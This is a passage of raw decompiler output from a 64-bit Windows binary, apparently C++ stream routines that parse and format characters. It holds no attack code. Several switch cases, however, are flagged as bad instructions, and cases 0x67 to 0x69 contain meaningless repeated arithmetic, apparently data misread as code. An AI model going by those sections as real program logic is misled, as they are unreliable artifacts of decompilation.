0) {\n            if (*(ppiVar70 + 0xae) == '\\0') {\n                unaff_R15 = *(*(ppiVar70 + 0x30) + 0x38);\n            }\n            else {\n                unaff_R15 = *(*(ppiVar70 + 0x30) + 0x48);\n            }\n            unaff_R14 = 0x1;\n            goto code_r0x00014003a4c0;\n        }\n        if (uVar43 == 0) {\ncode_r0x00014003a9f5:\n            bVar90 = uVar50 == 0xffff;\n            goto code_r0x00014003a9fd;\n        }\n        uVar59 = *(ppiVar70 + 0xe8);\njoined_r0x00014003adaf:\n        if (1 < uVar59) {\n            *(ppiVar70 + -8) = 0x14003b045;\n            uVar59 = fcn.1400298f0(*(ppiVar70 + 0x88), 0x30, 0);\n            if (uVar59 != 0) {\n                uVar73 = *(ppiVar70 + 0xe8);\n                if (uVar59 == 0xffffffffffffffff) {\n                    uVar59 = uVar73 - 1;\n                    if (uVar73 == 0) {\n                        **(ppiVar70 + 0xe0) = 0;\n                    }\n                    else if (uVar59 != 0) goto code_r0x00014003b060;\n                }\n                else {\ncode_r0x00014003b060:\n                    if (uVar59 <= uVar73) {\n                        uVar73 = uVar59;\n                    }\n                    *(ppiVar70 + -8) = 0x14003b076;\n                    fcn.1400a3120(*(ppiVar70 + 0x88), 0, uVar73);\n                }\n            }\n        }\n        if ((*(ppiVar70 + 0xae) != '\\0') && (**(ppiVar70 + 0xe0) != '0')) {\n            *(ppiVar70 + 0x20) = 0x2d;\n            *(ppiVar70 + -8) = 0x14003adec;\n            fcn.1400a1690(*(ppiVar70 + 0x88), 0, 0, 1);\n        }\n        iVar67 = *(ppiVar70 + 200);\n        if (iVar67 != 0) {\n            uVar91 = *(ppiVar70 + 0xa8);\n            if (*(ppiVar70 + 0xad) == '\\0') {\n                uVar91 = *(ppiVar70 + 0x3c);\n            }\n            iVar57 = *(ppiVar70 + 0xc0);\n            if (iVar57 == *(ppiVar70 + 0x68)) {\n                uVar59 = 0xf;\n            }\n            else {\n                uVar59 = *(ppiVar70 + 0xd0);\n            }\n            if (uVar59 < iVar67 + 1U) {\n                *(ppiVar70 + 0x20) = 1;\n                *(ppiVar70 + -8) = 0x14003b349;\n                fcn.1400a3380(*(ppiVar70 + 0x90), iVar67, 0, 0);\n                iVar57 = *(ppiVar70 + 0xc0);\n            }\n            *(iVar57 + iVar67) = uVar91;\n            *(ppiVar70 + 200) = iVar67 + 1U;\n            uVar58 = *(ppiVar70 + 0x90);\n            *(*(ppiVar70 + 0xc0) + 1 + iVar67) = 0;\n            uVar5 = *(*(ppiVar70 + 0x30) + 0x18);\n            noname_0 = *(*(ppiVar70 + 0x30) + 0x10);\n            *(ppiVar70 + -8) = 0x14003ae76;\n            cVar42 = fcn.1400b1590(noname_0, uVar5, uVar58);\n            if (cVar42 == '\\0') {\n                **(ppiVar70 + 0x178) = **(ppiVar70 + 0x178) | 4;\n            }\n        }\n        bVar90 = uVar50 == 0xffff;\n        if ((*(ppiVar70 + 0xad) != '\\0') && (*(*(ppiVar70 + 0x30) + 0x58) != *(ppiVar70 + 0x3c)))\n        goto code_r0x00014003a9fd;\n        *(ppiVar70 + -8) = 0x14003aebe;\n        fcn.1400a18b0(*(ppiVar70 + 0x180), *(ppiVar70 + 0x88));\n        bVar92 = arg1 != NULL && bVar90;\n        if (arg1 == NULL || !bVar90) goto code_r0x00014003aa18;\n        break;\n    case 0x51:\n        unaff_RBP = &stack0xffffffffffffff90;\n        uStack120 = &stack0xffffffffffffff90;\n        ppiVar80 = auStack33927;\n        puVar86 = unaff_RDI + 0x1400fdfb2;\n        bVar90 = 0x2f < *puVar86;\n        *puVar86 = *puVar86 - 0x30;\ncode_r0x00014003a6b2:\n        if (bVar90) {\n            *(ppiVar80 + 0x20) = 1;\n            *(ppiVar80 + -8) = 0x14003a95f;\n            fcn.1400a3380(*(ppiVar80 + 0x88), unaff_RDI, 0, 0);\n            ppiVar60 = *(ppiVar80 + 0xe0);\n        }\n        *(ppiVar60 + unaff_RDI) = unaff_R13;\n        *(ppiVar80 + 0x3c) = *(ppiVar80 + 0x3c) + 1;\n        *(ppiVar80 + 0xe8) = unaff_R12;\n        *(*(ppiVar80 + 0xe0) + 1 + unaff_RDI) = 0;\ncode_r0x00014003a6d6:\n        piVar55 = arg1[2];\n        if (arg1[3] <= piVar55) goto code_r0x00014003a92b;\ncode_r0x00014003a6e4:\n        arg1[2] = piVar55 + 2;\n        do {\n            unaff_RDI = 0xffffffff;\n            unaff_R13 = 0x1;\n            cVar42 = '\\x01';\n            unaff_R12 = arg1 != NULL;\n            if (arg1 != NULL) {\n                if (arg1[2] < arg1[3]) {\n                    iVar47 = *arg1[2];\n                }\n                else {\n                    pcVar3 = (*arg1)[9];\n                    *(ppiVar80 + -8) = 0x14003b099;\n                    iVar47 = (*pcVar3)(arg1);\n                }\n                if (iVar47 == -1) {\n                    arg1 = NULL;\n                }\n                else {\n                    unaff_R12 = NULL;\n                }\n            }\n            else {\n                unaff_R12 = 0x1;\n            }\n            ppiVar60 = *(ppiVar80 + 0x3a) == -1;\n            bVar90 = unaff_RBP != NULL && *(ppiVar80 + 0x3a) == -1;\n            if (bVar90) {\n                if (unaff_RBP[2] < unaff_RBP[3]) {\n                    iVar47 = *unaff_RBP[2];\n                }\n                else {\n                    pcVar3 = *(*unaff_RBP + 0x48);\n                    *(ppiVar80 + -8) = 0x14003b15f;\n                    iVar47 = (*pcVar3)(unaff_RBP);\n                }\n                if (iVar47 == -1) {\n                    unaff_RBP = NULL;\n                }\n                if (SUB81(unaff_R12, 0) != (iVar47 == -1 && bVar90)) goto code_r0x00014003a645;\ncode_r0x00014003a9e0:\n                uVar50 = unaff_RDI;\n                iVar67 = *(ppiVar80 + 0xe8);\n                unaff_R14 = 0x1;\n                ppiVar70 = ppiVar80;\njoined_r0x00014003a9ef:\n                if (iVar67 != 0) goto code_r0x00014003a74d;\n                goto code_r0x00014003a9f5;\n            }\ncode_r0x00014003a63c:\n            cVar42 = unaff_R13;\n            if (unaff_R12 == ppiVar60) goto code_r0x00014003a9e0;\ncode_r0x00014003a645:\n            uVar50 = unaff_RDI;\n            uVar49 = uVar50;\n            if ((arg1 != NULL) && (cVar42 != '\\0')) {\n                if (arg1[2] < arg1[3]) {\n                    uVar49 = *arg1[2];\n                }\n                else {\n                    pcVar3 = (*arg1)[9];\n                    *(ppiVar80 + -8) = 0x14003b089;\n                    uVar49 = (*pcVar3)(arg1);\n                }\n                if (uVar49 == 0xffff) {\n                    arg1 = NULL;\n                }\n            }\n            ppiVar88 = *(ppiVar80 + 0x40);\n            do {\n                if (uVar49 == *ppiVar88) {\n                    unaff_RDI = *(ppiVar80 + 0xe8);\n                    unaff_R12 = unaff_RDI + 1;\n                    unaff_R13 = *(*unaff_R15 + (ppiVar88 - *(ppiVar80 + 0x58) >> 1));\n                    ppiVar60 = *(ppiVar80 + 0xe0);\n                    ppiVar88 = *(ppiVar80 + 0xf0);\n                    if (ppiVar60 == *(ppiVar80 + 0x50)) {\n                        ppiVar88 = 0xf;\n                    }\n                    bVar90 = ppiVar88 < unaff_R12;\n                    goto code_r0x00014003a6b2;\n                }\n                ppiVar88 = ppiVar88 + 2;\n            } while (ppiVar88 != unaff_RSI);\n            if (*(*(ppiVar80 + 0x30) + 0x22) == uVar49) {\n                if (*(ppiVar80 + 0xad) != '\\0') {\ncode_r0x00014003ab1a:\n                    unaff_R14 = *(ppiVar80 + 0xad);\n                    goto code_r0x00014003ab23;\n                }\n                if (*(*(ppiVar80 + 0x30) + 0x58) < 1) goto code_r0x00014003a9e0;\n                uVar2 = *(ppiVar80 + 0x3c);\n                *(ppiVar80 + 0xad) = 1;\n                *(ppiVar80 + 0x3c) = 0;\n                *(ppiVar80 + 0xa8) = uVar2;\n                goto code_r0x00014003a6d6;\n            }\n            uVar43 = *(*(ppiVar80 + 0x30) + 0x20);\n            unaff_R14 = uVar43;\n            if (uVar43 == 0) goto code_r0x00014003a9e0;\n            if (*(*(ppiVar80 + 0x30) + 0x24) != uVar49) {\ncode_r0x00014003ab23:\n                iVar67 = *(ppiVar80 + 0xe8);\n                ppiVar70 = ppiVar80;\n                goto joined_r0x00014003a9ef;\n            }\n            if (*(ppiVar80 + 0xad) != '\\0') goto code_r0x00014003ab1a;\n            iVar85 = *(ppiVar80 + 0x3c);\n            if (iVar85 == 0) {\n                unaff_R14 = NULL;\n                goto code_r0x00014003ab23;\n            }\n            iVar67 = *(ppiVar80 + 200);\n            iVar57 = *(ppiVar80 + 0xc0);\n            if (iVar57 == *(ppiVar80 + 0x68)) {\n                uVar59 = 0xf;\n            }\n            else {\n                uVar59 = *(ppiVar80 + 0xd0);\n            }\n            if (uVar59 < iVar67 + 1U) {\n                *(ppiVar80 + 0x20) = 1;\n                *(ppiVar80 + -8) = 0x14003aaff;\n                fcn.1400a3380(*(ppiVar80 + 0x90), iVar67, 0, 0);\n                iVar57 = *(ppiVar80 + 0xc0);\n            }\n            *(iVar57 + iVar67) = iVar85;\n            *(ppiVar80 + 200) = iVar67 + 1U;\n            *(ppiVar80 + 0x3c) = 0;\n            *(*(ppiVar80 + 0xc0) + 1 + iVar67) = 0;\n            piVar55 = arg1[2];\n            if (piVar55 < arg1[3]) goto code_r0x00014003a6e4;\ncode_r0x00014003a92b:\n            pcVar3 = (*arg1)[10];\n            *(ppiVar80 + -8) = 0x14003a934;\n            (*pcVar3)(arg1);\n        } while( true );\n    case 0x52:\n        if (bVar92) goto code_r0x00014003a63c;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        ppiVar80 = &piStack104;\n        goto code_r0x00014003a63c;\n    case 0x53:\n        bVar90 = uVar52 == 0xffffffff;\n        do {\n            uVar59 = unaff_R12 & 0xffffffff;\n            if (bVar90) {\n                arg1 = NULL;\n            }\n            else {\n                uVar59 = 0;\n            }\n            while( true ) {\n                bVar90 = uStack48._2_2_ == -1;\n                bVar92 = unaff_RBP != NULL && bVar90;\n                if (bVar92) {\n                    if (unaff_RBP[2] < unaff_RBP[3]) {\n                        iVar47 = *unaff_RBP[2];\n                    }\n                    else {\n                        iVar47 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n                    }\n                    bVar90 = iVar47 == -1 && bVar92;\n                    if (iVar47 == -1) {\n                        unaff_RBP = NULL;\n                    }\n                }\n                ppiVar70 = &piStack104;\n                if (bVar90 == uVar59) goto code_r0x00014003a74d;\n                if ((arg1 != NULL) && (unaff_R13 != '\\0')) {\n                    if (arg1[2] < arg1[3]) {\n                        iVar47 = *arg1[2];\n                    }\n                    else {\n                        iVar47 = (*(*arg1)[9])(arg1);\n                    }\n                    if (iVar47 == -1) {\n                        arg1 = NULL;\n                    }\n                }\n                cVar42 = (**(*piStackX8 + 0x10))();\n                ppiVar70 = &piStack104;\n                if (cVar42 == '\\0') goto code_r0x00014003a74d;\n                if (arg1[2] < arg1[3]) {\n                    arg1[2] = arg1[2] + 2;\n                }\n                else {\n                    (*(*arg1)[10])(arg1);\n                }\n                unaff_RDI = 0xffffffff;\n                unaff_R13 = 0x1;\n                unaff_R12 = arg1 != NULL;\n                if (arg1 != NULL) break;\n                uVar59 = 1;\n            }\n            if (arg1[2] < arg1[3]) {\n                iVar47 = *arg1[2];\n            }\n            else {\n                iVar47 = (*(*arg1)[9])(arg1);\n            }\n            bVar90 = iVar47 == -1;\n        } while( true );\n    case 0x54:\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\ncode_r0x00014003a4c0:\n        while( true ) {\n            uVar50 = unaff_RDI;\n            bVar90 = uVar50 == 0xffff;\n            bVar84 = arg1 != NULL && bVar90;\n            bVar92 = bVar90;\n            if (bVar84) {\n                if (arg1[2] < arg1[3]) {\n                    iVar47 = *arg1[2];\n                }\n                else {\n                    pcVar3 = (*arg1)[9];\n                    *(ppiVar70 + -8) = 0x14003b227;\n                    iVar47 = (*pcVar3)(arg1);\n                }\n                if (iVar47 == -1) {\n                    arg1 = NULL;\n                }\n                bVar92 = iVar47 == -1 && bVar84;\n            }\n            bVar84 = unaff_RBP != NULL && *(ppiVar70 + 0x3a) == -1;\n            if (bVar84) break;\n            if ((*(ppiVar70 + 0x3a) == -1) == bVar92) goto code_r0x00014003ad98;\ncode_r0x00014003a4fd:\n            if (*(ppiVar70 + 0x60) <= unaff_R14) goto code_r0x00014003ad98;\n            uVar49 = uVar50;\n            if ((arg1 != NULL) && (bVar90)) {\n                if (arg1[2] < arg1[3]) {\n                    uVar49 = *arg1[2];\n                }\n                else {\n                    pcVar3 = (*arg1)[9];\n                    *(ppiVar70 + -8) = 0x14003b35f;\n                    uVar49 = (*pcVar3)(arg1);\n                }\n                if (uVar49 == 0xffff) {\n                    arg1 = NULL;\n                }\n            }\n            if (*(unaff_R15 + unaff_R14 * 2) != uVar49) goto code_r0x00014003a9fd;\n            if (arg1[2] < arg1[3]) {\n                arg1[2] = arg1[2] + 2;\n            }\n            else {\n                pcVar3 = (*arg1)[10];\n                *(ppiVar70 + -8) = 0x14003afb2;\n                (*pcVar3)(arg1);\n            }\n            unaff_R14 = unaff_R14 + 1;\n            unaff_RDI = 0xffffffff;\n        }\n        if (unaff_RBP[2] < unaff_RBP[3]) {\n            iVar47 = *unaff_RBP[2];\n        }\n        else {\n            pcVar3 = *(*unaff_RBP + 0x48);\n            *(ppiVar70 + -8) = 0x14003b325;\n            iVar47 = (*pcVar3)(unaff_RBP);\n        }\n        if (iVar47 == -1) {\n            unaff_RBP = NULL;\n        }\n        if ((iVar47 == -1 && bVar84) != bVar92) goto code_r0x00014003a4fd;\ncode_r0x00014003ad98:\n        if (unaff_R14 == *(ppiVar70 + 0x60)) {\n            uVar59 = *(ppiVar70 + 0xe8);\n            goto joined_r0x00014003adaf;\n        }\ncode_r0x00014003a9fd:\n        **(ppiVar70 + 0x178) = **(ppiVar70 + 0x178) | 4;\n        bVar92 = arg1 != NULL & bVar90;\n        if (bVar92 == false) goto code_r0x00014003aa18;\n        break;\n    case 0x58:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x59:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x60:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x61:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x62:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 99:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 100:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x65:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x66:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x67:\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *0x14010094d = *0x14010094d + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        puVar86 = unaff_RBP + 6;\n        uVar45 = *puVar86;\n        *puVar86 = *puVar86 + uVar68;\n        *(uVar59 + 0x1400fdfd1) = *(uVar59 + 0x1400fdfd1) + uVar43 + CARRY1(uVar45, uVar68);\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *0x14010095d = *0x14010095d + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        puVar86 = arg1 + 6;\n        uVar45 = *puVar86;\n        *puVar86 = *puVar86 + uVar87;\n        *(uVar59 + 0x1400fdfd1) = *(uVar59 + 0x1400fdfd1) + uVar43 + CARRY1(uVar45, uVar87);\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *unaff_RSI = *unaff_RSI - 0x30;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        puVar86 = arg1 + 6;\n        uVar45 = *puVar86;\n        *puVar86 = *puVar86 + uVar87;\n        *(uVar59 + 0x1400fdfd1) = *(uVar59 + 0x1400fdfd1) + uVar43 + CARRY1(uVar45, uVar87);\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *unaff_RSI = *unaff_RSI - 0x30;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *(arg3 + 0x1401006) = *(arg3 + 0x1401006) + -0x30;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *(ppiVar60 * 2) = *(ppiVar60 * 2) + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        uVar45 = *ppiVar60;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        uVar87 = *unaff_RSI;\n        puVar62 = ppiVar60 & 0xffffffffffffff00 | uVar87;\n        *(puVar62 + 1) = *(puVar62 + 1) + uVar87 + CARRY1(uVar45, uVar43);\n        *puVar62 = *puVar62 + uVar87;\n        *(puVar62 * 2) = *(puVar62 * 2) + uVar87;\n        *puVar62 = *puVar62 + uVar87;\n        *puVar62 = *puVar62 | puVar62;\n        uVar43 = *puVar62;\n        *puVar62 = *puVar62 + uVar87;\n        *unaff_RSI = piStack104;\n        *(puVar62 + 1) = *(puVar62 + 1) + uVar87 + CARRY1(uVar43, uVar87);\n        *puVar62 = *puVar62 + uVar87;\n        *unaff_RDI = *unaff_RDI + uVar87;\n        *puVar62 = *puVar62 + uVar87;\n        *puVar62 = *puVar62 + uVar87;\n        *puVar62 = *puVar62 + uVar87;\n        uVar51 = puVar62 + 0x14010;\n        cVar42 = uVar51;\n        *uVar51 = *uVar51 + cVar42;\n        pcVar53 = uVar51;\n        *pcVar53 = *pcVar53 + cVar42;\n        *pcVar53 = *pcVar53 + cVar42;\n        *pcVar53 = *pcVar53 + cVar42;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x68:\n        cVar65 = *unaff_RDI + -0x30;\n        uVar43 = uVar43 + *ppiVar60;\n        pcVar53 = ppiVar60 & 0xffffffffffffff00 | uVar43;\n        pcVar53[-0x73] = pcVar53[-0x73] + cVar65;\n        *pcVar53 = *pcVar53 + uVar43;\n        pcVar53[-0x73] = pcVar53[-0x73] + cVar65;\n        *(pcVar53 * 9) = in_FS;\n        *pcVar53 = *pcVar53 + uVar43;\n        *(unaff_RBP + 0x31) = *(unaff_RBP + 0x31) + uVar43;\n        puVar86 = pcVar53 + -0x39;\n        *puVar86 = *puVar86 >> 4 | *puVar86 << 4;\n        uVar59 = uVar43 & 0xffffffffffffffc8;\n        pcVar53 = ppiVar60 & 0xffffffffffffff00 | uVar59;\n        cVar42 = uVar59;\n        *pcVar53 = *pcVar53 + cVar42;\n        *pcVar53 = *pcVar53 + cVar42;\n        *pcVar53 = *pcVar53 + cVar42;\n        *(arg1 + -0x73) = *(arg1 + -0x73) + cVar65;\n        goto code_r0x00014003f047;\n    case 0x69:\n        puVar66 = 0x1400fdfcf;\n        if (bVar92) {\n            puVar86 = in_R11 + 0x43 + in_stack_00000038 * 4;\n            uVar45 = *puVar86;\n            uVar43 = *puVar86;\n            *puVar86 = (uVar43 + 0x31) - bVar90;\n            *unaff_RDI = *unaff_RDI + -0x31 + (uVar45 < 0xcf || uVar43 + 0x31 < bVar90);\n            arg1 = arg1 & 0xffffffffffff0000 | CONCAT11(0x53, cVar42);\n            goto code_r0x00014003efa8;\n        }\n        ppiVar70 = unaff_RDI + 1;\n        *unaff_RDI = uVar43;\n        *ppiVar70 = *ppiVar70 + uVar52 + bVar90;\n        *(arg1 + 0xa007efd9) = *(arg1 + 0xa007efd9) + -0x31;\n        pcVar53 = ppiVar60 & 0xffffffffffffffa8;\n        *pcVar53 = *pcVar53 + pcVar53;\n        *(unaff_RBP + 0x1400fdfaf) = *(unaff_RBP + 0x1400fdfaf) + -0x31;\n        goto code_r0x00014003eff1;\n    case 0x6a:\ncode_r0x00014003efa8:\n        fcn.1400a5030(puVar66, 0, in_stack_00000030, unaff_R15);\n        ppiVar88 = in_stack_00000038;\n        iVar67 = fcn.1400b0190(in_stack_00000038, *(arg1 + 0x24), arg1[2], arg1[3]);\n        pcVar53 = iVar67 - ppiVar88;\n        ppiVar70 = unaff_RDI;\n        ppiVar88 = in_stack_00000040;\ncode_r0x00014003eff1:\n        uVar51 = unaff_RBP;\n        ppiVar60 = pcVar53 >> 1;\n        if (ppiVar88 < ppiVar60) goto code_r0x00014003f61c;\n        *(in_stack_00000038 + pcVar53) = 0;\n        iVar85 = *(arg1 + 0xb);\n        unaff_RDI = ppiVar70;\n        in_stack_00000040 = ppiVar60;\ncode_r0x00014003f01e:\n        ppiVar60 = in_stack_00000040;\n        if (iVar85 < 1) {\ncode_r0x00014003f026:\n            puStackX16 = *(unaff_RSI + 3) & 0xffffffff000000b0;\n            unaff_R15 = auStack40._0_8_ + in_stack_00000040;\n            if ((*(unaff_RSI + 3) & 0x200) != 0) {\n                unaff_R15 = unaff_R15 + arg1[6];\n            }\ncode_r0x00014003f047:\n            ppiVar60 = &stack0x00000068;\n            puVar66 = &stack0x00000058;\n            in_stack_00000030 = NULL;\n            in_stack_00000060 = NULL;\n            arg3 = unaff_R15 * 2;\n            puStack24 = puVar66;\n            ppiVar70 = ppiVar60;\ncode_r0x00014003f074:\n            in_stack_00000068 = SUB81(in_stack_00000030, 0);\n            in_stack_00000069 = in_stack_00000030 >> 8;\n            in_stack_00000058 = ppiVar60;\n            fcn.1400a6b00(puVar66, arg3);\n            ppiVar60 = unaff_RSI[2];\n            puVar66 = &stack0x00000030 + 4;\n            bVar90 = puStackX16 == 0x10 && unaff_R15 < ppiVar60;\n            ppiVar75 = in_stack_00000060;\n            do {\n                if (*puVar66 < 5) {\n                    switch(*puVar66) {\n                    case 0:\n                        if (bVar90) {\ncode_r0x00014003f1e7:\n                            ppiVar88 = ppiVar60 - unaff_R15;\n                            fcn.1400a5030(puStack24, ppiVar75, 0, ppiVar88);\n                            ppiVar75 = in_stack_00000060;\n                        }\n                        break;\n                    case 1:\ncode_r0x00014003f180:\n                        if (bVar90) goto code_r0x00014003f1e7;\n                        ppiVar78 = ppiVar75 + 1;\n                        if (in_stack_00000058 == ppiVar70) {\n                            ppiVar72 = 0x7;\n                        }\n                        else {\n                            ppiVar72 = CONCAT62(in_stack_0000006a, CONCAT11(in_stack_00000069, in_stack_00000068));\n                        }\n                        if (ppiVar72 < ppiVar78) {\n                            ppiVar88 = NULL;\n                            fcn.1400a6e10(puStack24, ppiVar75, 0, 0);\n                        }\n                        *(in_stack_00000058 + ppiVar75 * 2) = uStack30;\n                        in_stack_00000060 = ppiVar78;\n                        *(in_stack_00000058 + ppiVar75 * 2 + 2) = 0;\n                        ppiVar75 = ppiVar78;\n                        break;\n                    case 2:\n                        if ((*(unaff_RSI + 0x19) & 2) != 0) {\n                            ppiVar78 = arg1[6];\n                            ppiVar72 = arg1[5];\n                            if (ppiVar78 <= 0x1fffffffffffffff - ppiVar75) goto code_r0x00014003f236;\n                            fcn.1400b7170(0x1400fe0e2);\n                            goto code_r0x00014003f180;\n                        }\n                        break;\n                    case 3:\n                        if (auStack40._0_8_ != NULL) {\n                            uVar46 = *puStack16;\n                            ppiVar78 = ppiVar75 + 1;\n                            if (in_stack_00000058 == ppiVar70) {\n                                ppiVar72 = 0x7;\n                            }\n                            else {\n                                ppiVar72 = CONCAT62(in_stack_0000006a, CONCAT11(in_stack_00000069, in_stack_00000068));\n                            }\n                            if (ppiVar72 < ppiVar78) {\n                                ppiVar88 = NULL;\n                                fcn.1400a6e10(puStack24, ppiVar75, 0, 0);\n                            }\n                            *(in_stack_00000058 + ppiVar75 * 2) = uVar46;\n                            in_stack_00000060 = ppiVar78;\n                            *(in_stack_00000058 + ppiVar75 * 2 + 2) = 0;\n                            ppiVar75 = ppiVar78;\n                        }\n                        break;\n                    case 4:\n                        ppiVar72 = in_stack_00000038;\n                        ppiVar78 = in_stack_00000040;\n                        if (0x1fffffffffffffff - ppiVar75 < in_stack_00000040) {\n                            auStack40._0_8_ = in_stack_00000040;\n                            fcn.1400b7170(0x1400fe0e2);\n                            goto code_r0x00014003f5f8;\n                        }\ncode_r0x00014003f236:\n                        fcn.1400a6c40(puStack24, ppiVar72, ppiVar78);\n                        ppiVar75 = in_stack_00000060;\n                    }\n                }\n                puVar66 = puVar66 + 1;\n            } while (uStack48 != puVar66);\n            if (auStack40._0_8_ < 2) {\ncode_r0x00014003f266:\n                if (ppiVar75 < ppiVar60) {\n                    if (puStackX16 == 0x20) {\n                        fcn.1400a5030(puStack24, ppiVar75, 0, ppiVar60 - ppiVar75);\n                        ppiVar75 = ppiVar60;\n                    }\n                    else {\n                        fcn.1400a5030(puStack24, 0, 0, ppiVar60 - ppiVar75);\n                        ppiVar75 = ppiVar60;\n                    }\n                }\n                uVar59 = unaff_R13 & 0xffffffff;\n                if ((unaff_R13 == '\\0') &&\n                   (iVar67 = (**(*piStack56 + 0x60))(piStack56, in_stack_00000058, ppiVar75),  ppiVar75 != iVar67)) {\n                    uVar59 = 1;\n                }\n                if (in_stack_00000058 != ppiVar70) {\n                    fcn.1400b64d0(in_stack_00000058);\n                }\n                if (in_stack_00000038 != in_stack_00000000) {\n                    fcn.1400b64d0();\n                }\n                unaff_RSI[2] = NULL;\n                in_stack_000000c8[1] = unaff_R13 & 0xffffffffffffff00 | uVar59 & 0xff;\n                *in_stack_000000c8 = piStack56;\n                return in_stack_000000c8;\n            }\n            auStack40._0_8_ = auStack40._0_8_ - 1;\n            if (auStack40._0_8_ <= 0x1fffffffffffffff - ppiVar75) {\n                fcn.1400a6c40(puStack24, puStack16 + 1, auStack40._0_8_);\n                ppiVar75 = in_stack_00000060;\n                goto code_r0x00014003f266;\n            }\ncode_r0x00014003f604:\n            fcn.1400b7170(0x1400fe0e2);\n            unaff_R14 = auStack40._0_8_;\n        }\n        else {\n            ppiVar70 = in_stack_00000040 + 1;\n            puStack24 = puStack24 & 0xffffffffffff0000 | *(arg1 + 0x22);\n            if (in_stack_00000038 == in_stack_00000000) {\n                ppiVar88 = 0x7;\n            }\n            else {\n                ppiVar88 = CONCAT62(in_stack_0000004a, CONCAT11(in_stack_00000049, in_stack_00000048));\n            }\n            if (ppiVar88 < ppiVar70) {\n                fcn.1400a6e10(uStack48, in_stack_00000040, 0, 0);\n            }\n            ppiVar88 = NULL;\n            *(in_stack_00000038 + ppiVar60 * 2) = puStack24._0_2_;\n            *(in_stack_00000038 + ppiVar60 * 2 + 2) = 0;\n            in_stack_00000040 = ppiVar70;\n            if (uVar51 < 0) {\n                auStack40._0_8_ = NULL;\n                ppiVar88 = -uVar51;\n                fcn.1400a5030(uStack48, ppiVar70, 0, ppiVar88);\n                if (unaff_R14 <= 0x1fffffffffffffff - in_stack_00000040) goto code_r0x00014003f3a9;\ncode_r0x00014003f5f8:\n                fcn.1400b7170(0x1400fe0e2);\n                goto code_r0x00014003f604;\n            }\n            unaff_R14 = *(arg1 + 0xb);\n            unaff_RDI = unaff_RDI + uVar51 * 2;\n            if (unaff_R14 <= 0x1fffffffffffffff - ppiVar70) {\ncode_r0x00014003f3a9:\n                fcn.1400a6c40(uStack48, unaff_RDI, unaff_R14);\n                goto code_r0x00014003f026;\n            }\n        }\n        fcn.1400b7170(0x1400fe0e2);\n        ppiVar60 = unaff_R14;\ncode_r0x00014003f61c:\n        uVar58 = fcn.1400b1a60(0x1400fe138, 0x1400fe124, ppiVar60, ppiVar88);\n        fcn.1400b6670(uVar58);\n        (*(*arg1)[1])(arg1);\n        do {\n            uVar58 = fcn.1400b6b70();\n            fcn.1400b6670(uVar58);\n        } while( true );\n    case 0x6b:\n        in_stack_00000000 = &stack0x00000048;\n        puVar66 = &stack0x00000038;\n        in_stack_00000040 = NULL;\n        in_stack_00000048 = 0;\n        in_stack_00000049 = 0;\n        in_stack_00000038 = in_stack_00000000;\n        fcn.1400a6b00(puVar66, ppiVar60);\n        iVar85 = *(arg1 + 0xb);\n        uVar51 = unaff_R14 - iVar85;\n        unaff_RBP = uVar51;\n        uStack48 = puVar66;\n        if (0 < uVar51) {\n            if (iVar85 < 0) {\n                unaff_RBP = unaff_R14 & 0xffffffff;\n            }\n            uVar51 = unaff_RBP;\n            if (arg1[3] != NULL) {\n                unaff_R15 = uVar51 * 2;\n                in_stack_00000030 = in_stack_00000040;\n                goto code_r0x00014003efa8;\n            }\n            ppiVar88 = unaff_RDI;\n            fcn.1400a46d0(puVar66, 0, in_stack_00000040, unaff_RDI);\n            iVar85 = *(arg1 + 0xb);\n        }\n        goto 